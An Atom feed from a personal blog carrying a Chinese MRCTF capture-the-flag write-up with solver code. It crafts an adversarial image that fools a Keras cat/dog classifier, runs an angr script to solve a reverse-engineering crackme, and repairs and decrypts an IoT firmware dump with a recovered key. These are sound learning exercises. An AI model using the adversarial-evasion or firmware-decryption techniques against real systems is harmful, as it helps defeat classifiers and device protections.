<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>fancy&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://f4ncy.top/"/>
  <updated>2022-05-22T03:11:40.625Z</updated>
  <id>https://f4ncy.top/</id>
  
  <author>
    <name>fancy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>MRCTF</title>
    <link href="https://f4ncy.top/2022/05/05/MRCTF/"/>
    <id>https://f4ncy.top/2022/05/05/MRCTF/</id>
    <published>2022-05-05T12:21:45.000Z</published>
    <updated>2022-05-22T03:11:40.625Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><h2 id="MISC-SPY-DOG"><a href="#MISC-SPY-DOG" class="headerlink" title="MISC:SPY_DOG"></a>MISC:SPY_DOG</h2><p>题目的逻辑是</p><p>提供狗的图片，需要处理图片，根据已知模型生成可以欺骗该模型，识别为猫的图片，这是一个对抗神经网络的白盒攻击任务。</p><p><a href="https://blog.csdn.net/u010420283/article/details/83685140?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-5&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-5">https://blog.csdn.net/u010420283/article/details/83685140?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-5&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-5</a></p><p>另外附带要求，生成伪造图片需要保证预测为cat的分值大于0.99，像素差值小于10。</p><p>这里介绍的是通过梯度下降的方式生成样本进行迭代，使用的是keras库。</p><p>通过模型可视化输出查看：</p><p>输入层（Input）：输入为128<em>128</em>3大小图像矩阵。</p><p>卷积层（Conv1）：32个126*126大小的卷积核。</p><p>Pooling层（Pool1）：Max Pooling窗口大小为2×2。</p><p>卷积层（Conv2）：32个63*63大小的卷积核。</p><p>Pooling层（Pool2）：Max Pooling窗口大小为2×2。</p><p>卷积层（Conv3）：64个30*30大小的卷积核。</p><p>Pooling层（Pool2）：Max Pooling窗口大小为2×2。</p><p>flatten层：一维化展开。</p><p>FC层（dense）:将展开的25088的map整合成512的map</p><p>输出层\FC层（dense_1）（output）:将512的map整合成2的map，即输出2个分类。</p><p>我们了解到这是一个4层的卷积神经网络模型，我们需要关注的是输入层和输出层，输入层是一个对128<em>128</em>3（长、宽、颜色通道）的图像处理层，输出层为输出2个神经节点（即是否为猫）：</p><p><img src="https://docimg6.docs.qq.com/image/2xYPw8XXIXhE6YhlFLNsfA.png?w=926&h=184" alt="img"><br>                                                                                。。。</p><p><img src="https://docimg1.docs.qq.com/image/vKmb0RXwoViLwzmXGjTZ_A.png?w=670&h=176" alt="img">        </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> mod</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> keras.applications <span class="keyword">import</span> inception_v3</span><br><span class="line"><span class="keyword">from</span> keras <span class="keyword">import</span> backend <span class="keyword">as</span> K</span><br><span class="line"><span class="keyword">from</span> keras.utils <span class="keyword">import</span> plot_model</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> hashlib,random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> load_model</span><br><span class="line"><span class="keyword">from</span> keras.utils <span class="keyword">import</span> image_utils</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line">tf.compat.v1.disable_eager_execution()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkMask</span>(<span class="params">model, img</span>):</span></span><br><span class="line">    predict = model.predict(img)</span><br><span class="line">    <span class="keyword">return</span> predict[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Loading......&quot;</span>)</span><br><span class="line">model = load_model(<span class="string">&quot;./simplenn.model&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;You are a spy from the country of dog, try your best to get flag from cats.&quot;</span>)</span><br><span class="line"><span class="comment">#plot_model(model, to_file=&#x27;./model.png&#x27;, show_shapes=True)</span></span><br><span class="line">layer_1 = K.function([model.layers[<span class="number">0</span>].<span class="built_in">input</span>], [model.layers[-<span class="number">1</span>].output])  <span class="comment"># 第一个 model.layers[0],不修改,表示输入数据；第二个model.layers[you wanted],修改为你需要输出的层数的编号</span></span><br><span class="line"><span class="comment"># img = image_utils.load_img(&quot;./another.bmp&quot;, target_size=(128, 128))</span></span><br><span class="line"><span class="comment"># img_tensor = image_utils.img_to_array(img)</span></span><br><span class="line"><span class="comment"># img_tensor /= 255.</span></span><br><span class="line"><span class="comment"># img_tensor -= 0.5</span></span><br><span class="line"><span class="comment"># img_tensor *= 2.</span></span><br><span class="line"><span class="comment"># img_tensor = np.expand_dims(img_tensor, axis=0)</span></span><br><span class="line">img = cv2.imread(<span class="string">&quot;./another.bmp&quot;</span>)</span><br><span class="line">img = cv2.resize(img, (<span class="number">128</span>, <span class="number">128</span>))</span><br><span class="line">img_tensor = np.expand_dims(img, axis=<span class="number">0</span>)</span><br><span class="line">img_tensor = img_tensor.astype(np.float32)</span><br><span class="line">img_tensor /= <span class="number">255.</span></span><br><span class="line"><span class="comment"># img = cv2.imread(&quot;./another.bmp&quot;)</span></span><br><span class="line"><span class="comment"># img = cv2.resize(img, (128, 128))</span></span><br><span class="line"><span class="comment"># img_tensor = np.expand_dims(img, axis=0)</span></span><br><span class="line"><span class="comment"># img_tensor = img_tensor.astype(np.float32)</span></span><br><span class="line"><span class="comment"># img_tensor /= 255.</span></span><br><span class="line">f1 = layer_1([img_tensor])[<span class="number">0</span>]  <span class="comment"># 只修改inpu_image,[:1]代表一张图片</span></span><br><span class="line"><span class="comment"># 第一层卷积后的特征图展示，输出是（样本个数，特征图尺寸长，特征图尺寸宽，特征图个数）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;dog:&quot;</span>,f1[:,<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;cat:&quot;</span>,f1[:,<span class="number">1</span>])       <span class="comment"># 样本个数，特征图尺寸长，特征图尺寸宽，特征图个数</span></span><br><span class="line"><span class="comment">#for _ in range(32):</span></span><br><span class="line">    <span class="comment"># show_img = f1[:, :, :, _]         # 样本个数，特征图尺寸长，特征图尺寸宽，特征图个数</span></span><br><span class="line">    <span class="comment"># print(&#x27;show_img&#x27;,show_img.shape)    # show_img (1, 22, 22)</span></span><br><span class="line">    <span class="comment"># show_img.shape = [126, 126]           # 跟show_img的形状一直</span></span><br><span class="line">    <span class="comment"># plt.subplot(4, 8, _ + 1)</span></span><br><span class="line">    <span class="comment"># plt.imshow(show_img, cmap=&#x27;gray&#x27;)</span></span><br><span class="line">    <span class="comment"># plt.axis(&#x27;off&#x27;)</span></span><br><span class="line"><span class="comment">#plt.show()</span></span><br><span class="line">max_change_above = img_tensor + <span class="number">0.039</span></span><br><span class="line">max_change_below = img_tensor - <span class="number">0.039</span></span><br><span class="line"><span class="comment"># Load pre-trained image recognition model</span></span><br><span class="line"><span class="comment">#model = inception_v3.InceptionV3()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Grab a reference to the first and last layer of the neural net</span></span><br><span class="line"><span class="comment"># print(&quot;model.layers:&quot;)</span></span><br><span class="line"><span class="comment"># print(model.layers)</span></span><br><span class="line">model_input_layer = model.layers[<span class="number">0</span>].<span class="built_in">input</span></span><br><span class="line">model_output_layer = model.layers[-<span class="number">1</span>].output</span><br><span class="line"><span class="comment"># print(&quot;model.layers[-1].output:&quot;)</span></span><br><span class="line"><span class="comment"># print(type(model_output_layer))</span></span><br><span class="line"><span class="comment"># sess = tf.compat.v1.InteractiveSession()</span></span><br><span class="line"><span class="comment"># sess.run(tf.compat.v1.global_variables_initializer())</span></span><br><span class="line"><span class="comment"># print(type(model_output_layer[0, 0].eval()))</span></span><br><span class="line"><span class="comment"># print(model_output_layer[0, 0].eval())</span></span><br><span class="line"><span class="comment"># print(model_output_layer[0, 1].eval())</span></span><br><span class="line">cost_function = model_output_layer[<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">gradient_function = K.gradients(cost_function, model_input_layer)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#gradient_function= K.GradientTape(cost_function, model_input_layer)[0]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose an ImageNet object to fake</span></span><br><span class="line"><span class="comment"># The list of classes is available here: https://gist.github.com/ageitgey/4e1342c10a71981d0b491e1b8227328b</span></span><br><span class="line"><span class="comment"># Class #859 is &quot;toaster&quot;</span></span><br><span class="line"><span class="comment"># object_type_to_fake = 859</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # Load the image to hack</span></span><br><span class="line"><span class="comment"># img = image.load_img(&quot;cat.png&quot;, target_size=(299, 299))</span></span><br><span class="line"><span class="comment"># original_image = image.img_to_array(img)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # Scale the image so all pixel intensities are between [-1, 1] as the model expects</span></span><br><span class="line"><span class="comment"># original_image /= 255.</span></span><br><span class="line"><span class="comment"># original_image -= 0.5</span></span><br><span class="line"><span class="comment"># original_image *= 2.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # Add a 4th dimension for batch size (as Keras expects)</span></span><br><span class="line"><span class="comment"># original_image = np.expand_dims(original_image, axis=0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pre-calculate the maximum change we will allow to the image</span></span><br><span class="line"><span class="comment"># We&#x27;ll make sure our hacked image never goes past this so it doesn&#x27;t look funny.</span></span><br><span class="line"><span class="comment"># A larger number produces an image faster but risks more distortion.</span></span><br><span class="line"><span class="comment"># max_change_above = original_image + 0.01</span></span><br><span class="line"><span class="comment"># max_change_below = original_image - 0.01</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a copy of the input image to hack on</span></span><br><span class="line"><span class="comment">#hacked_image = np.copy(original_image)</span></span><br><span class="line">hacked_image = np.copy(img_tensor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># How much to update the hacked image in each iteration</span></span><br><span class="line">learning_rate = <span class="number">0.1</span></span><br><span class="line"><span class="comment"># Define the cost function.</span></span><br><span class="line"><span class="comment"># Our &#x27;cost&#x27; will be the likelihood out image is the target class according to the pre-trained model</span></span><br><span class="line"><span class="comment">#cost_function = model_output_layer[0, object_type_to_fake]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># We&#x27;ll ask Keras to calculate the gradient based on the input image and the currently predicted class</span></span><br><span class="line"><span class="comment"># In this case, referring to &quot;model_input_layer&quot; will give us back image we are hacking.</span></span><br><span class="line"><span class="comment">#gradient_function = K.gradients(cost_function, model_input_layer)[0]</span></span><br><span class="line"><span class="comment"># Create a Keras function that we can call to calculate the current cost and gradient</span></span><br><span class="line">grab_cost_and_gradients_from_model = K.function([model_input_layer, K.learning_phase()], [cost_function, gradient_function])</span><br><span class="line">cost = <span class="number">0.0</span></span><br><span class="line"><span class="comment"># In a loop, keep adjusting the hacked image slightly so that it tricks the model more and more</span></span><br><span class="line"><span class="comment"># until it gets to at least 80% confidence</span></span><br><span class="line"><span class="keyword">while</span> cost &lt; <span class="number">0.9994</span>:</span><br><span class="line">    <span class="comment"># Check how close the image is to our target class and grab the gradients we</span></span><br><span class="line">    <span class="comment"># can use to push it one more step in that direction.</span></span><br><span class="line">    <span class="comment"># Note: It&#x27;s really important to pass in &#x27;0&#x27; for the Keras learning mode here!</span></span><br><span class="line">    <span class="comment"># Keras layers behave differently in prediction vs. train modes!</span></span><br><span class="line">    cost,gradients = grab_cost_and_gradients_from_model([hacked_image, <span class="number">0</span>])</span><br><span class="line">    <span class="comment"># Move the hacked image one step further towards fooling the model</span></span><br><span class="line">    hacked_image += gradients * learning_rate</span><br><span class="line">    <span class="comment"># Ensure that the image doesn&#x27;t ever change too much to either look funny or to become an invalid image</span></span><br><span class="line">    hacked_image = np.clip(hacked_image, max_change_below, max_change_above)</span><br><span class="line">    <span class="comment">#hacked_image = np.clip(hacked_image, -1.0, 1.0)</span></span><br><span class="line">    img = hacked_image[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Model&#x27;s predicted likelihood that the image is a cat: &#123;:.8&#125;%&quot;</span>.<span class="built_in">format</span>(cost * <span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># De-scale the image&#x27;s pixels from [-1, 1] back to the [0, 255] range</span></span><br><span class="line">img = hacked_image[<span class="number">0</span>]</span><br><span class="line">img *= <span class="number">255.</span></span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">&quot;hacked-image2.bmp&quot;</span>,img)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the hacked image!</span></span><br><span class="line"><span class="comment"># im = Image.fromarray(img.astype(np.uint8))</span></span><br><span class="line"><span class="comment"># im.save(&quot;hacked-image.bmp&quot;)</span></span><br><span class="line"></span><br><span class="line">filename=<span class="string">&quot;./hacked-image2.bmp&quot;</span></span><br><span class="line">score = <span class="number">0</span></span><br><span class="line">img = cv2.imread(filename)</span><br><span class="line">img = cv2.resize(img, (<span class="number">128</span>, <span class="number">128</span>))</span><br><span class="line">img_tensor = np.expand_dims(img, axis=<span class="number">0</span>)</span><br><span class="line">img_tensor = img_tensor.astype(np.float32)</span><br><span class="line">img_tensor /= <span class="number">255.</span></span><br><span class="line">score=checkMask(model,img_tensor)</span><br><span class="line">cost,gradients = grab_cost_and_gradients_from_model([img_tensor, <span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;finaly cost:&quot;</span>,cost)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;finaly score:&quot;</span>,score)</span><br></pre></td></tr></table></figure><p>将图片base64传上即可：<br><img src="https://docimg1.docs.qq.com/image/XtFgfrpcakjelIAzjiLQdA.png?w=1280&h=543.030303030303" alt="img">        </p><h2 id="RE-CICADA"><a href="#RE-CICADA" class="headerlink" title="RE:CICADA"></a>RE:CICADA</h2><p>SMC的题，dicada.exe会解密一个PE文件，验证逻辑在这个PE文件中，分析处理逻辑，流程是输入32字节key经过一个很长处理后,根据返回值是否为true来判断我们的输入是否正确，目前使用angr跑了出来.<br>![img](<a href="https://docimg4.docs.qq.com/image/n90Nv0VIE8viQ610zs3u9Q.png?w=1100&amp;h=510#pic_center">https://docimg4.docs.qq.com/image/n90Nv0VIE8viQ610zs3u9Q.png?w=1100&amp;h=510#pic_center</a> align=”middle”)<br><img src="https://docimg1.docs.qq.com/image/AsZkKtkRbaaGubqXDKcqNA.png?w=803&h=456" alt="img" style="zoom:80%;" align="middle"><br>![img](<a href="https://docimg6.docs.qq.com/image/vE0Hhn72A1i3BQdGlomQlg.png?w=1038&amp;h=547">https://docimg6.docs.qq.com/image/vE0Hhn72A1i3BQdGlomQlg.png?w=1038&amp;h=547</a> align=”middle” )        </p><p>angr脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&#x27;./sub.exe&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># good = (0x18002536A)</span></span><br><span class="line"><span class="comment"># bad = (0x180025339)</span></span><br><span class="line">good = (<span class="number">0x18000BD6D</span>)</span><br><span class="line">bad = (<span class="number">0x18000BD79</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start = <span class="number">0x18000bd43</span></span><br><span class="line"><span class="comment">#state = p.factory.entry_state()</span></span><br><span class="line">state = p.factory.blank_state(addr=start)</span><br><span class="line">state_rsp=state.regs.rsp</span><br><span class="line"><span class="built_in">print</span>(state_rsp)<span class="comment">#0x7ffffffffff0000</span></span><br><span class="line">state.regs.rcx=state_rsp+<span class="number">0x38</span></span><br><span class="line">state.regs.rdx=state.solver.BVS(<span class="string">&quot;lastbyte&quot;</span>,<span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(state.regs.rcx)</span><br><span class="line">flag=state.solver.BVS(<span class="string">&quot;flag&quot;</span>,<span class="number">16</span>*<span class="number">8</span>)</span><br><span class="line">state.memory.store(state_rsp+<span class="number">0x38</span>,flag,endless=p.arch.memory_endness)</span><br><span class="line">simulation = p.factory.simgr(state)</span><br><span class="line">simulation.explore(find=good, avoid=bad)</span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    hexflag=solution_state.solver.<span class="built_in">eval</span>(flag,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;%02x&#x27;</span> % b <span class="keyword">for</span> b <span class="keyword">in</span> hexflag]))</span><br><span class="line">    <span class="comment"># for i in range(3):</span></span><br><span class="line">    <span class="comment">#     print (solution_state.posix.dumps(i))</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;Could not find the solution&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://docimg4.docs.qq.com/image/XhGSw_617h8LRg9itFwW7w.png?w=576&h=67" alt="img"></p><h2 id="IoT"><a href="#IoT" class="headerlink" title="IoT"></a>IoT</h2><p>参考：</p><p><a href="http://www.ctfiot.com/37681.htmlhttp://www.ctfiot.com/37681.html">http://www.ctfiot.com/37681.htmlhttp://www.ctfiot.com/37681.html</a></p><p><a href="http://www.ctfiot.com/38677.htmlhttp://www.ctfiot.com/38677.html">http://www.ctfiot.com/38677.htmlhttp://www.ctfiot.com/38677.html</a></p><p>查看文件，PNF-9010R.img镜像文件被加密，我们需要分析S34MLxx固件获取密钥及加密逻辑。      <img src="https://docimg4.docs.qq.com/image/ReyKrrM8GcYyQ1LK1tRoow.png?w=770&h=148" alt="img"> </p><p><strong>Nand Flash</strong></p><p>NandFlash有特定的存储结构，可分为plane，block以及page。以Spansion S34ML0*为例，其由2快plane组成，每块plane由1024 block组成，每块block由64 page组成，每page有(2048 + 128)=2176字节。其中128字节为OOB区，用作校验和坏块管理，具体管理方式可参考该flash的datasheet。</p><blockquote><p>内部ECC对于主要区域的每528字节（x8）和备用区域的每16字节（x8）提供了9位检测码和8位校正码。[…] 在PROGRAM操作过程中，在页面被写入NAND Flash阵列之前，设备会在缓存寄存器中的2k页面上计算ECC代码。ECC代码被存储在页面的备用区域。 在读操作中，页面数据从阵列中被读到缓存寄存器中，在那里ECC代码被计算出来，并与从阵列中读取的ECC代码值进行比较。如果检测出1-8位的错误，将通过高速缓存寄存器进行纠正。只有经过纠正的数据，才会在I/O总线上输出。<br>通过编程器提取该flash固件，可得文件大小285,212,672字节=0x11000000字节=2(plane)*(1024block)*64(page)*2176(byte)，恰好符合datasheet描述。但需要注意的是，此时binwalk并不能有效识别该固件的组成及提取其中的文件系统。这是由于坏块以及OOB的存在，因此固件分析的第一步是筛选坏块并去除OOB区.<br>坏块筛选规则：the 1st byte in the spare area of the 1st or 2nd or last page does not contain FFh is a Bad block.<br>OOB去除，可去除每隔2048字节的128字节校验值。</p></blockquote><p>然而，经过上述操作后，binwalk仍不能正确提取识别。</p><p>初次经过人工分析，所有全0字节内存页中，有如下现象：页起始偏移1040字节的14字节有数据；OOB区的前两字节为FF，后14字节数据为全0。不经让人怀疑是上下两部分的数据区和校验区发生了调换。而事实也却是如此，具体需要了解yaffs2在(2k+128) NandFlash的存储结构以及uboot烧写的yaffs过程[1 2 3]。</p><p>NAND闪存是以内存页为单位进行编程和读取的。一个内存页由2048字节的可用存储空间和128字节的OOB组成，后者用于存储纠错代码和坏块管理的标志，也就是说，页面的总长度为2176字节。不过，对于擦除操作来说，则是以块为单位进行的。根据Micron公司的文档，对于这个闪存部分，一个块由64页组成，总共有128KB的可用数据。该闪存由两个面组成，每个面包含1024个块，因此： 2 planes * 1024 blocks/plane * 64 pages/block * (2048 + 128) bytes/page = 285,212,672</p><p>尝试每隔2048字节移除128字节，发现得到的固件文件仍然无法正常提取，分析发现oob的3-16字节是有用的：</p><p><img src="https://docimg3.docs.qq.com/image/y3hJZV7Q0mmdODBHusVYSw.png?w=1280&h=167.3846153846154" alt="img">        </p><p>另外，发现每个page偏倚0x410处存在14字节无意义<br><img src="https://docimg1.docs.qq.com/image/HQVjTQaim9QFdjTivw0kSg.png?w=1112&h=284" alt="img">        oob的格式与datasheet上介绍的不同。</p><p>删除修正后的oob：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">a=<span class="built_in">open</span>(<span class="string">r&#x27;S34ML02G200BHI00@BGA63_948.BIN&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">unOOBBin=<span class="built_in">open</span>(<span class="string">&#x27;unoob2.bin&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">data=a.read()</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">filesize=<span class="built_in">len</span>(data)</span><br><span class="line"><span class="keyword">while</span>(i&lt;filesize):</span><br><span class="line">    unOOBBin.write(data[i:i+<span class="number">0x410</span>])</span><br><span class="line">    unOOBBin.write(data[i+<span class="number">0x410</span>+<span class="number">14</span>:i+<span class="number">0x800</span>])</span><br><span class="line">    unOOBBin.write(data[i+<span class="number">0x800</span>+<span class="number">2</span>:i+<span class="number">0x800</span>+<span class="number">2</span>+<span class="number">14</span>])</span><br><span class="line">    i=i+<span class="number">2048</span>+<span class="number">128</span></span><br><span class="line">a=<span class="built_in">open</span>(<span class="string">r&#x27;unoob2.bin&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">b=<span class="built_in">open</span>(<span class="string">r&#x27;extractELF.sh&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>) <span class="comment">#shell脚本</span></span><br></pre></td></tr></table></figure><p>再次使用binwalk尝试提取，发现分离出的ext2可以正常读取了：</p><p><img src="https://docimg3.docs.qq.com/image/fU8RBxVWZxZbbJH2ILR9aQ.png?w=656&h=288" alt="img">       <img src="https://docimg2.docs.qq.com/image/YokVW5GaS-2Khs6h6QIJHg.png?w=330&h=518" alt="img">   </p><p>搜索特征字符串获取到解密逻辑（ext2文件系统中得到的magic_update中的加密是针对另一型号设备的，后来发现针对题目给的镜像文件所属型号的加密是在固件中的单独提取的mainServer ELF文件中）：</p><p>openssl enc -in PNF-9010R.img -aes-256-cbc -d -k STWPNF-9010R -out PNF-9010R-dec.img</p><p>对解密后的img解压即可看到flag。</p><p><img src="https://docimg8.docs.qq.com/image/2ER3ZAGfjTMxav0dFBM01g.png?w=954&h=526" alt="img"> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>TMF框架简介</title>
    <link href="https://f4ncy.top/2021/12/03/TMF/"/>
    <id>https://f4ncy.top/2021/12/03/TMF/</id>
    <published>2021-12-03T08:54:02.263Z</published>
    <updated>2021-12-08T06:34:02.000Z</updated>
    
